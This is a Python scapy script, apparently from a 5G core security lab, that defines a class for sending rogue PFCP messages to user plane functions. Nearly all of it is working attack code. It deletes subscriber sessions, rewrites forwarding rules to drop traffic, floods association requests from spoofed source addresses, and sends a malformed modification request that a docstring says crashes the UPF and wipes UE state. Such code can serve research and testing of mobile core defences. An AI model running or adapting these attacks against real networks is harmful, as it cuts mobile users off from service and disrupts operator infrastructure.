from scapy.all import sendp, send, sr1,srp1, sniff, Packet, hexdump, Ether, IP, ICMP, UDP 
from scapy.contrib.pfcp import *
import os
import time

iface="enp0s3"
#iface="lo"
#iface="uesimtun0"

class PFCP_sender:
    """
    A class that sends rogue PFCP messages to upfs.
    """
    def __init__(self, source_ip="10.0.14.10", destination_ips=["10.0.17.1"]):
        #print ("source ip", source_ip, "destination_ip", destination_ips)
        self.source_ip=source_ip
        self.seq=60
        self.message_type_mapping={54: "Session Delete Request",
                                   5: "Association Request",
                                   52: "Session Modification Request"
                                    }
        if not type(destination_ips)== list:
            self.destination_ips=[destination_ips]
        else:
            self.destination_ips=destination_ips
    
    def gen_modification_request(self, destination_ip="10.0.17.1", teid=1):
        """
        """
        pkt=Ether(dst="08:00:27:a1:1d:e8", src="08:00:27:a1:1d:e9", type="IPv4" )/IP(src=self.source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=52,seid=teid , seq=self.seq)/PFCPSessionModificationRequest(IE_list=[IE_UpdateFAR(length=36, IE_list=[IE_FAR_Id(length=4, id=1), IE_ApplyAction(length=2, DROP=1), IE_UpdateForwardingParameters(length=19, IE_list=[IE_DestinationInterface(length=1), IE_OuterHeaderCreation(length=10, GTPUUDPIPV4=1,TEID=teid, ipv4=self.source_ip) ]) ])])
        return pkt
        
    def gen_misconfigured_modification_request(self, destination_ip="10.0.17.1", teid=1):
        """
        This leads to the UPF restarting and losing all UE information
        """
        pkt=Ether(dst="08:00:27:a1:1d:e8", src="08:00:27:a1:1d:e9", type="IPv4" )/IP(src=self.source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=52,seid=teid , seq=self.seq)/PFCPSessionModificationRequest(IE_list=[IE_UpdateFAR(length=36, IE_list=[IE_FAR_Id(length=4, id=1), IE_ApplyAction(length=2, DROP=1), IE_UpdateForwardingParameters(length=19, IE_list=[IE_DestinationInterface(length=1), IE_OuterHeaderCreation(length=10, GTPUUDPIPV4=1,TEID=teid, ipv4=self.source_ip) ]) ])])
        return pkt
        
    def gen_packet(self,t=54,destination_ip=None, seid=1, source_ip=None):
        """
        54 deletion, 5 associate request, Heartbeat
        """
        if destination_ip==None:
            destination_ip=self.destination_ips[0]
        if source_ip==None:
            source_ip=self.source_ip
        if t==52:
            pkt=self.gen_modification_request(destination_ip=destination_ip, teid=seid)
        else:
            pkt=Ether(dst="08:00:27:a1:1d:e8", src="08:00:27:a1:1d:e9", type="IPv4" )/IP(src=source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=t,seid=seid, length=12 , seq=self.seq)
            #pkt=IP(src=self.source_ip,version=4, dst=destination_ip, ihl=5, flags="DF", len=None, chksum=None)/UDP(dport=8805, sport=8805, len=None, chksum=None)/PFCP(version=1, message_type=t,seid=seid, length=12 , seq=self.seq)
        pkt= Ether(bytes(pkt))
        pkt.show()
        #pkt=IP(src=self.source_ip, dst=destination_ip, ihl=5, flags="DF")/UDP(dport=8805, sport=8805)/PFCP(version=1, message_type=t,seid=seid, length=12 , seq=self.seq)
        self.seq+=1
        return pkt

    def send_packet(self, t, destination_ip, seid=1, source_ip=None):
        """
        """
        if source_ip==None:
            source_ip=self.source_ip
        if destination_ip==None:
            destination_ip=self.destination_ips[0]
        p= self.gen_packet(t=t, destination_ip=destination_ip, seid=seid, source_ip=source_ip)
        sendp(p, iface=iface)
        #p.show()
        to_print="Sending " +str(self.message_type_mapping[t]) 
        if t==5: #todo session modifcation request
            to_print+= " with SEID: " +str(seid)
        to_print+=" to UPF at: "
        to_print+= destination_ip
        
    def associate_request(self, destination_ips=None, source_ip=None):
        """
        In order to send requests we need to associate to the upfs first.
        """
        if source_ip==None:
            source_ip=self.source_ip
        if destination_ips==None:
            destination_ips=self.destination_ips
        for ip in destination_ips:
                self.send_packet(t=5, destination_ip=ip, source_ip=source_ip) 
                
    def flood_request(self, t, seid_range=(0,10)):
       """
       """
       for seid in range(seid_range[0], seid_range[1]):
           if seid%4==0:
               self.associate_request()#associate to upf, we will not be bothering with hearbeats so we have to reassociate every couple requests
           for ip in self.destination_ips:
               self.send_packet(t=t, destination_ip=ip, seid=seid)
                 
  
    def targeted_request(self, t, seid, destination_ip=None):
        """
        """
        if destination_ip==None:
            destination_ip=self.destination_ips[0]         
        self.associate_request(destination_ips=[destination_ip])
        self.send_packet(t=t, destination_ip=destination_ip, seid=seid)
        
    
    def targeted_session_delete_request(self,seid=1, destination_ip=None):
        """
        Delete a specific session on a upf
        """
        self.targeted_request(t=54, seid=seid, destination_ip=destination_ip)
        

    def flood_session_delete_requests(self, seid_range=(0,10)):
        """
        Flood sesseion delete packets in a seid_range.
        """
        self.flood_request(t=54, seid_range=seid_range)
        
    def targeted_session_modification_request(self,seid=1, destination_ip=None):
        """
        Delete a specific session on a upf
        """
        self.targeted_request(t=52, seid=seid, destination_ip=destination_ip)
        

    def flood_session_modification_requests(self, seid_range=(0,10)):
        """
        Flood sesseion delete packets in a seid_range.
        """
        self.flood_request(t=52, seid_range=seid_range)
        
    def flood_associate_requests(self, source_ip_range=(0,255)):
        """
        flood associate requests to targets. 
        """
        print("Will flood targets ",  self.destination_ips, " with association requests.")
        i=source_ip_range[0]
        while True:
            try:
               self.associate_request(source_ip="10."+str(i)+".0.1")
               #self.associate_request(source_ip="10.0."+str(i)+".1")
               if i==source_ip_range[1]:
                  i=source_ip_range[0]
               else:
                   i+=1
            except KeyboardInterrupt:
                print("Ending Flood.")
                break
                
                
    def malformed_modifcation_request(self):
        """
        Leads to the upf restarting.
        """
        for ip in self.destination_ips:
            p=self.gen_misconfigured_modification_request(destination_ip=ip)
            p.show()
            sendp(p, iface=iface)
        
                
           
                        




